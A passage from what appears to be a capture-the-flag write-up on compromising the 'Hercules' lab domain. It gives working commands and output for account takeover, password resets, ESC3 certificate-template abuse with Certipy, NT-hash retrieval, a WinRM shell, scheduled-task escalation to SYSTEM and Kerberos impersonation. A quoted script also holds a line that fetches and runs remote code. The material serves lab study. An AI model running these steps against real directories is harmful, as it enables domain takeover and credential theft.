Allow NT AUTHORITY\SELF               SPECIAL ACCESS for msDS-AllowedToActOnBehalfOfOtherIdentity   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for Private Information   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
                                      CONTROL ACCESS
Allow HERCULES\Helpdesk Administrators
                                      Reset Password   <Inherited from parent>

Permissions inherited to subobjects are:
Inherited to all subobjects
Allow HERCULES\Forest Management      SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Allow HERCULES\auditor                FULL CONTROL
Allow HERCULES\Enterprise Admins      FULL CONTROL   <Inherited from parent>
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      LIST CONTENTS
Allow BUILTIN\Administrators          SPECIAL ACCESS   <Inherited from parent>
                                      DELETE
                                      READ PERMISSONS
                                      WRITE PERMISSIONS
                                      CHANGE OWNERSHIP
                                      CREATE CHILD
                                      LIST CONTENTS
                                      WRITE SELF
                                      WRITE PROPERTY
                                      READ PROPERTY
                                      LIST OBJECT
                                      CONTROL ACCESS
Allow HERCULES\Key Admins             SPECIAL ACCESS for msDS-KeyCredentialLink   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow HERCULES\Enterprise Key Admins  SPECIAL ACCESS for msDS-KeyCredentialLink   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for msDS-AllowedToActOnBehalfOfOtherIdentity   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for Private Information   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
                                      CONTROL ACCESS
Allow HERCULES\Helpdesk Administrators
                                      Reset Password   <Inherited from parent>

Inherited to user
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Account Restrictions   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Logon Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Group Membership   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for General Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Remote Access Information   <Inherited from parent>
                                      READ PROPERTY
Allow NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
                                      SPECIAL ACCESS for tokenGroups   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Inherited to inetOrgPerson
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Account Restrictions   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Logon Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Group Membership   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for General Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Remote Access Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Inherited to group
Allow NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
                                      SPECIAL ACCESS for tokenGroups   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Inherited to computer
Allow CREATOR OWNER                   SPECIAL ACCESS for Validated write to computer attributes.   <Inherited from parent>
                                      WRITE SELF
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for Validated write to computer attributes.   <Inherited from parent>
                                      WRITE SELF
Allow NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
                                      SPECIAL ACCESS for tokenGroups   <Inherited from parent>
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for msTPM-TpmInformationForComputer   <Inherited from parent>
                                      WRITE PROPERTY
The command completed successfully
```
##### 2 Enable `fernando` Account since it's disabled

```powershell
PS C:\Users\auditor\Documents> Enable-ADAccount -Identity "CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -ErrorAction SilentlyContinue
```
#### 3 Reset password of `fernando`

Now that we have GenericAll we can reset the password:

```powershell
PS C:\Users\auditor\Documents> Set-ADAccountPassword -Identity "fernando.r" -NewPassword (ConvertTo-SecureString "at0m1234!" -AsPlainText -Force) -Reset
```
##### 4 Request TGT

```bash
$ impacket-getTGT -dc-ip 10.129.176.116 hercules.htb/fernando.r:at0m1234!
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fernando.r.ccache
```

If you get creds have been revoked error you need to repeat from Step 1 above and be fast since configuration changes fast in machine.
## Certipy

```bash
$ export KRB5CCNAME=fernando.r.ccache

$ certipy find -k -dc-ip 10.129.176.116 -target dc.hercules.htb  -enabled -vulnerable -stdout  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'CA-HERCULES' via CSRA
[!] Got error while trying to get CA configuration for 'CA-HERCULES' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'CA-HERCULES'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : CA-HERCULES
    DNS Name                            : dc.hercules.htb
    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
    Certificate Validity End            : 2034-12-04 01:44:17+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : HERCULES.HTB\Administrators
      Access Rights
        ManageCertificates              : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        ManageCa                        : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Enroll                          : HERCULES.HTB\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDnsAsCn
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Principals       : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC3                              : 'HERCULES.HTB\\Smartcard Operators' can enroll and template has Certificate Request Agent EKU set
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Principals       : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC3                              : 'HERCULES.HTB\\Smartcard Operators' can enroll and template has Certificate Request Agent EKU set
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Principals       : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC3                              : 'HERCULES.HTB\\Smartcard Operators' can enroll and template has Certificate Request Agent EKU set
```
## [ESC 3](https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/)

You can look more about ESC 3 in [here](https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/) or wiki but we can request certificate of `ashley.b` because she is in `IT Support group` (Check from bloodhound) so she might have administrative access.

```bash
sudo apt install certipy-ad # I am in Kali use Certipy 5.0.3
```

```bash
$ KRB5CCNAME=fernando.r.ccache certipy-ad req -k -upn fernando.r@hercules.htb -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target DC.hercules.htb -ca CA-HERCULES -template EnrollmentAgentOffline -application-policies 'Client Authentication' -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 67
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

Note: The `-dcom` flag in Certipy stands for **Distributed Component Object Model** and it's used for certificate requesting via a different protocol/transport method.

```bash
$ KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip "10.10.11.91" -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "User" -pfx fernando.r.pfx -on-behalf-of "hercules\ashley.b" -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 68
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

```bash
$ certipy-ad auth -pfx ashley.b.pfx -username ashley.b -domain hercules.htb -dc-ip 10.10.11.91
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

```bash
$ KRB5CCNAME=ashley.b.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\ashley.b
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

PS C:\Users\ashley.b\Documents> whoami
hercules\ashley.b
```

```powershell
PS C:\Users\ashley.b\Documents> ls


    Directory: C:\Users\ashley.b\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/21/2025   2:26 AM           6080 aCleanup.ps1


PS C:\Users\ashley.b\Documents> cat aCleanup.ps1
# Copyright (C) 2024 TroubleChute (Wesley Pyburn)
# Licensed under the GNU General Public License v3.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.gnu.org/licenses/gpl-3.0.en.html
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see .
#
# ----------------------------------------
# This script will clear a ton of known cache/temp folders on Windows
# A lot of these can be cleared without issue, but some require user
# input as they may contain things like logins and more.
# ----------------------------------------

Write-Host  "NOT READY"
Write-Host  "DO NOT USE"
#exit
exit
return


Write-Host "---------------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host "Welcome to TroubleChute's Cache & Temp Cleanup Tool!" -ForegroundColor Cyan
Write-Host "This script:" -ForegroundColor Cyan
Write-Host "- Automatically clear known Cache sources" -ForegroundColor Cyan
Write-Host "- Prompt you when deleting more important Cache/Temp folders" -ForegroundColor Cyan
Write-Host "[Version 2024-09-08]" -ForegroundColor Cyan
Write-Host "`nThis script is provided AS-IS without warranty of any kind. See https://tc.ht/privacy & https://tc.ht/terms."
Write-Host "Consider supporting these install scripts: https://tc.ht/support" -ForegroundColor Green
Write-Host "---------------------------------------------------------------------------`n" -ForegroundColor Cyan

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "This script needs to be run as an administrator.`nProcess can try to continue, but not all temp/cache folders can be cleared properly. Press Enter to continue..." -ForegroundColor Red
    Read-Host
}

Write-Host "NOTE: " -ForegroundColor Cyan -NoNewline
Write-Host "When options include one capital letter, eg: (Y/n), the capital letter is the default option." -ForegroundColor Yellow
Write-Host "Hitting Enter with nothing typed for (Y/n) will choose Yes. (y/N) will choose No.`n" -ForegroundColor Yellow

$startTime = Get-Date
Write-Host "Start Time: $startTime" -ForegroundColor Cyan
Write-Host "Getting free space..." -ForegroundColor Cyan

iex (irm Import-RemoteFunction.tc.ht)
Import-RemoteFunction("Get-GeneralFuncs.tc.ht")
# Import-FunctionIfNotExists -Command Get-FreeSpace -ScriptUri "File-Actions.tc.ht"
Import-Module C:\Users\tcno\Documents\GitHub\TcNo-TCHT\PowerShell\Modules\General\File-Actions.psm1 -Force

$startingFreeSpace = Get-FreeSpace
Write-Host  "Free space before cleanup: $startingFreeSpace`n" -ForegroundColor Cyan

function Confirm-Cleanup {
    param (
        [Parameter(Mandatory = $true)]
        [string[]]$Folders,
        [string]$Text,
        [bool]$DefaultYes = $true,
        [bool]$DryRun = $false
    )

    Write-Host "Clear $Text? Locations include:"
    foreach ($folder in $Folders) {
        $expandedFolder = [Environment]::ExpandEnvironmentVariables($folder)
        Write-Host "- $expandedFolder"
    }

    Write-Host "Total File Size: $(Get-FolderSizeInGB -Folders $Folders)" -ForegroundColor Cyan

    if ($(Confirm-Text -DefaultYes $DefaultYes)) {
        Remove-Folders -Folders $Folders -DryRun $DryRun
    }
}

function Confirm-Text {
    param (
        [bool]$DefaultYes = $true
    )

    do {
        $continue = Read-Host "Continue? (Y/n)"
    } while ($continue -notin "Y", "y", "1", "0", "N", "n", "")

    if ($DefaultYes) {
        if ($continue -in "Y", "y", "" ) {
            return $true
        } else {
            Write-Host "Skippping."
            return $false
        }
    } else {
        if ($continue -in "Y", "y" ) {
            return $true
        } else {
            Write-Host "Skippping."
            return $false
        }
    }
}

# You can find a lot of these that Windows Disk Cleanup uses in:
# Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\Temporary Files

$Folders = @("$env:WinDir\Temp", "$env:WinDir\Logs", "$env:WinDir\System32\LogFiles", "$env:WinDir\SystemTemp", "C:\Temp", "C:\tmp", "C:\Windows\Prefetch", "$env:LocalAppData\Temp");
Confirm-Cleanup -Text "known common temp/cache" -Folders $Folders


Write-Host "`nClear Windows Update cache?"

if ($(Confirm-Text -DefaultYes $true)) {
    $WUServ = Get-Service wuauserv

    if ($WUServ.Status -eq "Running") {
        Write-Host "Stopping Windows Update..." -ForegroundColor Cyan
        $WUServ | Stop-Service -Force
    }

    Write-Host "Cleaning Windows Update Cache..." -ForegroundColor Cyan
    $Folders = @("$env:windir\SoftwareDistribution\Download");
    Remove-Folders -Folders $Folders -DryRun $true
}


$Folders = @("$env:WinDir\Temp", "$env:LocalAppData\Temp", "$env:SystemDrive\ESD\Windows", "$env:SystemDrive\ESD\Download", "$env:SystemDrive\`$Windows.~WS", "$env:SystemDrive\`$Windows.~BT");
Confirm-Cleanup -Text "Windows installation/update log files & Cache" -Folders $Folders -DryRun $true


$endTime = Get-Date
Write-Host "End Time: $endTime" -ForegroundColor Cyan
$duration = $endTime - $startTime
Write-Host "Duration: $($duration.TotalSeconds) seconds" -ForegroundColor Cyan
Write-Host  "Free space before cleanup: $startingFreeSpace" -ForegroundColor Cyan
Write-Host  "Free space after cleanup: $(Get-FreeSpace)`n" -ForegroundColor Cyan
```

This `aCleanup.ps1` script is a **cache and temp file cleanup tool** that appears to be disabled (it exits immediately with "NOT READY" messages).

There is another one in `Desktop`:

```powershell
PS C:\Users\ashley.b\Desktop> ls


    Directory: C:\Users\ashley.b\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/4/2024  11:45 AM                Mail
-a----         12/4/2024  11:45 AM            102 aCleanup.ps1
```

```bash
PS C:\Users\ashley.b\Desktop> cat aCleanup.ps1
Start-ScheduledTask -TaskName "Password Cleanup"
```

There's a different `aCleanup.ps1` file on the Desktop that references a **"Password Cleanup" scheduled task**. The Desktop version of `aCleanup.ps1` runs a scheduled task called **"Password Cleanup"**  this is likely what runs with higher privileges.

```powershell
PS C:\Users\ashley.b\Desktop> # Get details about the "Password Cleanup" task
Get-ScheduledTask -TaskName "Password Cleanup" | Format-List *


State                 : Ready
Actions               : {MSFT_TaskExecAction}
Author                :
Date                  :
Description           : Attribute Cleanup for IT Support.
Documentation         :
Principal             : MSFT_TaskPrincipal2
SecurityDescriptor    :
Settings              : MSFT_TaskSettings3
Source                :
TaskName              : Password Cleanup
TaskPath              : \
Triggers              :
URI                   : \Password Cleanup
Version               :
PSComputerName        :
CimClass              : Root/Microsoft/Windows/TaskScheduler:MSFT_ScheduledTask
CimInstanceProperties : {Actions, Author, Date, Description...}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties
```

```powershell
PS C:\Users\ashley.b\Desktop> # Check what user/account this task runs as 
(Get-ScheduledTask -TaskName "Password Cleanup").Principal


DisplayName         :
GroupId             :
Id                  : Author
LogonType           : ServiceAccount
RunLevel            : Limited
UserId              : SYSTEM
ProcessTokenSidType : Default
RequiredPrivilege   :
PSComputerName      :
```

It runs as SYSTEM.

```powershell
PS C:\Users\ashley.b\Desktop> # Check what command/script this task executes
(Get-ScheduledTask -TaskName "Password Cleanup").Actions


Id               :
Arguments        : -File "C:\Users\Administrator\AppData\Local\Windows\Password Cleanup.ps1"
Execute          : powershell.exe
WorkingDirectory :
PSComputerName   :
```

Let's run this script which will clean the password. Remember previously we had gotten this:

```powershell
PS C:\Users\auditor\Documents> Enable-ADAccount -Identity "CN=iis_administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -ErrorAction S
ilentlyContinue
Insufficient access rights to perform the operation
```

So if we run this `aCleanup.ps1` script this will trigger the script as `SYSTEM` and we will not get this `Insufficient access rights to perform the operation` and will be able to enable `iis_administrator`.
##### 0. Run the `aCleanup.ps1`

```powershell
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
PS C:\Users\ashley.b\Desktop> Start-Sleep 5
```

Wait till few more seconds if 5 second doesn't work and you get `Insufficient access rights to perform the operation`. (10-30 seconds or repeat command again)
#### 1. Grant IT Support full control over Forest Migration OU (Do in `Auditor` won't work in Ashley)

```powershell
PS C:\Users\auditor\Documents> dsacls "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" /G "HERCULES\IT Support:GA" /I:T
```
#### 2. Enable `iis_administrator` account (Ashley)

```bash
PS C:\Users\ashley.b\Desktop> Enable-ADAccount -Identity "iis_administrator"
```

```bash
PS C:\Users\ashley.b\Desktop> Get-ADUser -Identity "iis_administrator" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
CN=Service Operators,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb
```

They are in Service Operators see what they can do.

They can reset password of  other user so we can try on `iis_webserver$` (This is the account we can see from bloodhound) but first we need to reset password of `iis_administrator`.
#### 3. Reset the password of `iis_administrator`

```powershell
PS C:\Users\ashley.b\Desktop> Set-ADAccountPassword -Identity "iis_administrator" -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Reset
```

```bash
$ impacket-getTGT hercules.htb/'iis_administrator':'Password123!' -dc-ip 10.10.11.91
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in iis_administrator.ccache
```

Lets get user account that are IIS-related user accounts.

```powershell
PS C:\Users\auditor\Documents> # Get all IIS-related user accounts and display just their names
Get-ADUser -Filter "Name -like '*iis*'" | Select-Object Name

Name
----
IIS_Administrator
IIS_Webserver$
IIS_HadesAppPool$
IIS_AppPoolIdentity$
IIS_DefaultAppPool$
```

Get permissions for all IIS user accounts:

```powershell
PS C:\Users\auditor\Documents> # Get permissions for all IIS user accounts
$iisUsers = Get-ADUser -Filter "Name -like '*iis*'"

foreach ($user in $iisUsers) {
    Write-Host "Permissions for: $($user.Name)" -ForegroundColor Yellow
    $userDetails = Get-ADUser -Identity $user.SamAccountName -Properties nTSecurityDescriptor
    $acl = $userDetails.nTSecurityDescriptor

    $acl.Access | Where-Object {
        $_.IdentityReference -like "*iis_administrator*" -or
        $_.IdentityReference -like "*Service Operators*"
    } | Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType, IsInherited

    Write-Host "------------------------" -ForegroundColor Gray
}


Permissions for: IIS_Administrator
------------------------
Permissions for: IIS_Webserver$

IdentityReference          ActiveDirectoryRights AccessControlType IsInherited
-----------------          --------------------- ----------------- -----------
HERCULES\Service Operators         ExtendedRight             Allow        True


------------------------
Permissions for: IIS_HadesAppPool$

IdentityReference          ActiveDirectoryRights AccessControlType IsInherited
-----------------          --------------------- ----------------- -----------
HERCULES\Service Operators         ExtendedRight             Allow        True


------------------------
Permissions for: IIS_AppPoolIdentity$

IdentityReference          ActiveDirectoryRights AccessControlType IsInherited
-----------------          --------------------- ----------------- -----------
HERCULES\Service Operators         ExtendedRight             Allow        True


------------------------
Permissions for: IIS_DefaultAppPool$

IdentityReference          ActiveDirectoryRights AccessControlType IsInherited
-----------------          --------------------- ----------------- -----------
HERCULES\Service Operators         ExtendedRight             Allow        True


------------------------
```

All seem to have `ExtendedRight` but let's see what that extended right is. So get all of their GUID:

```powershell
PS C:\Users\auditor\Documents> # Get specific ExtendedRight GUIDs for all IIS user accounts
$iisUsers = Get-ADUser -Filter "Name -like '*iis*'"

foreach ($user in $iisUsers) {
    Write-Host "ExtendedRight details for: $($user.Name)" -ForegroundColor Yellow
    $userDetails = Get-ADUser -Identity $user.SamAccountName -Properties nTSecurityDescriptor
    $acl = $userDetails.nTSecurityDescriptor

    $extendedRights = $acl.Access | Where-Object {
        $_.IdentityReference -like "*Service Operators*" -and
        $_.ActiveDirectoryRights -match "ExtendedRight"
    }

    foreach ($right in $extendedRights) {
        Write-Host "  Service Operators has ExtendedRight with GUID: $($right.ObjectType)" -ForegroundColor Cyan
        Write-Host "  Inheritance: $($right.InheritanceType)" -ForegroundColor White
    }

    if (-not $extendedRights) {
        Write-Host "  No ExtendedRight found" -ForegroundColor Gray
    }
    Write-Host "------------------------" -ForegroundColor Gray
}
ExtendedRight details for: IIS_Administrator
  No ExtendedRight found
------------------------
ExtendedRight details for: IIS_Webserver$
  Service Operators has ExtendedRight with GUID: 00299570-246d-11d0-a768-00aa006e0529
  Inheritance: All
------------------------
ExtendedRight details for: IIS_HadesAppPool$
  Service Operators has ExtendedRight with GUID: 00299570-246d-11d0-a768-00aa006e0529
  Inheritance: All
------------------------
ExtendedRight details for: IIS_AppPoolIdentity$
  Service Operators has ExtendedRight with GUID: 00299570-246d-11d0-a768-00aa006e0529
  Inheritance: All
------------------------
ExtendedRight details for: IIS_DefaultAppPool$
  Service Operators has ExtendedRight with GUID: 00299570-246d-11d0-a768-00aa006e0529
  Inheritance: All
```

We see all have `00299570-246d-11d0-a768-00aa006e0529` and if we see from [Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) its of `User-Force-Change-Password extended right` which means we can reset any `IIS` user password as `iis_administrator`. From bloodhound only one IIS related user account was showing up that was `iis_webserver$` so change its password:
#### 4. Change Password of `iis_webserver$` from `iis_administrator`:

```bash
$ KRB5CCNAME=iis_administrator.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -u 'iis_administrator' -k -H dc.hercules.htb set password iis_webserver$ 'Password123!'
[+] Password changed successfully!
```

Machine accounts (ending with `$`) typically use **NTLM hashes** for authentication so convert it and get the `ccache`.

```bash
$ impacket-getTGT -hashes :$(pypykatz crypto nt 'Password123!') 'hercules.htb'/'iis_webserver$'
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in iis_webserver$.ccache
```
## S4U2Self

- **Machine accounts** can perform **S4U2Self** (Service-for-User-to-Self)
- **S4U2Self** allows a service to get a ticket **to itself** on behalf of any user
- This is a **legitimate Windows feature** for services that need to impersonate users
- Only works for accounts **with SPNs** (services) which means **Service Accounts** (ending with `$`).

1. **We have**: `iis_webserver$` TGT (Ticket Granting Ticket)
2. **We want**: To impersonate `Administrator`
